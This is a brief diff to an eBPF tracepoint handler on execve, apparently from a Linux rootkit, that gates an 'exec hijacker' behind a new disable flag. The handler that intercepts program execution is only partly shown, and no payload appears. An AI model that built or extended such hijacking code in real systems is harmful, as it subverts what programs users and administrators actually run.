@@ -86,7 +86,7 @@ static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *c
 
 static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx, __u64 pid_tgid){
     //Check if the exec hijacker is active already
-    if(hijacker_state == 1){
+    if(hijacker_state == 1 || EXEC_HIJACK_ACTIVE_TEMP == 0){
         return 0;
     }
     bpf_printk("Starting execve hijacker\n");
